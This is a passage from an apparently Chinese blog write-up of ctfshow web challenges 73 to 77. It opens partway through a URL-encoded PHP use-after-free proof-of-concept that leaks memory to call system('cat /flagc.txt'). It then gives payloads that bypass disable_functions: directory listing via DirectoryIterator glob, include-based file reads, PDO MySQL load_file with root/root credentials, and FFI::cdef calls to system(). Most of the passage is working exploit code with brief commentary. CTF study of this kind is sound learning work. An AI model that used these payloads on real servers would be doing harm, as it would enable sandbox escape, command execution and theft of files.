20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20'WIN'))%20%7B%0A%20%20%20%20%20%20%20%20die('This%20PoC%20is%20for%20*nix%20systems%20only.')%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%0A%20%20%20%20trigger_uaf('x')%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B'args'%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflagc.txt%22)%3Bob_end_flush()%3B%0A%3F%3E
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4ec1cb5f49f9a93a036ca4a04494c900.png" alt="" style="max-height:183px; box-sizing:content-box;" />


发现uaf失败

那我们直接读取呢

```cobol
c=include('/flagc.txt');exit(0);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/048d5d4fb3d7223442f4e9b5610f88b5.png" alt="" style="max-height:145px; box-sizing:content-box;" />


发现没有过滤 include 相比 72 禁用了 uaf 但是 没有禁用include

## web74

```php
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/662203c6b85edb1ab4f423bb0d459814.png" alt="" style="max-height:153px; box-sizing:content-box;" />


然后include即可

```cobol
c=include('/flagx.txt');exit(0);
```

## web75 PDD执行读取文件

```php
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ae327e1b9684750280e0efef2d287194.png" alt="" style="max-height:122px; box-sizing:content-box;" />






<img src="https://i-blog.csdnimg.cn/blog_migrate/c1e1a867032d4afa4ba76e6cda4a2100.png" alt="" style="max-height:112px; box-sizing:content-box;" />


include 被ban



<img src="https://i-blog.csdnimg.cn/blog_migrate/d16c67958543ee909c052f1551c7fefa.png" alt="" style="max-height:53px; box-sizing:content-box;" />


UAF被ban

那我们只能调用进程来读取文件

```php
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh->query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e->getMessage();exit(0);}exit(0);
```

解释一下

```php
$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');
 
设置 dbh 为 pdo对象  内容为 mysql 本地 数据库命 登入弱口令
 
foreach($dbh->query('select load_file("/flag36.txt")') as $row)
 
使用 query 执行命令 读取 flag36.txt文件内容 作为 row变量
 
echo($row[0])."|"; 将查询第一列输出
 
$dbh = null; 关闭数据连接
 
catch (PDOException $e) {echo $e->getMessage();exit(0);}
 
如果出现异常 那么就输出异常 并且退出
 
 
exit(0); 绕过缓冲区清理
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2351a4b3a20305f503dbf266adae6398.png" alt="" style="max-height:181px; box-sizing:content-box;" />


## web76

```php
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/435a290573136aa8dc38506904a45ffa.png" alt="" style="max-height:204px; box-sizing:content-box;" />




```php
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh->query('select load_file("/flag36d.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e->getMessage();exit(0);}exit(0);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2aadd63484a8f027f2a40155e5220f5b.png" alt="" style="max-height:306px; box-sizing:content-box;" />


## web77  FFI (PHP 7 >= 7.4.0, PHP 8)



<img src="https://i-blog.csdnimg.cn/blog_migrate/e6e4725577d1588bd5e455b5eb5bef80.png" alt="" style="max-height:137px; box-sizing:content-box;" />


发现进程读取失败

这里又给出一个方法

FFI

```cobol
c=$ffi = FFI::cdef("int system(const char *command);");
$a='/readflag > 1.txt';
$ffi->system($a);
 
 
 
 
c=$ffi = FFI::cdef("int system(const char *command);");
 
设置 ffI变量 通过 FFI的cdef方法定义system函数的原型
 
然后设置变量 $a为 读取flag命令 并且重定位到  1.txt
 
通过 ffi变量执行 命令
```

最后访问1.txt



<img src="https://i-blog.csdnimg.cn/blog_migrate/02fe2d4a6029fea7b8b13850b714b5f9.png" alt="" style="max-height:129px; box-sizing:content-box;" />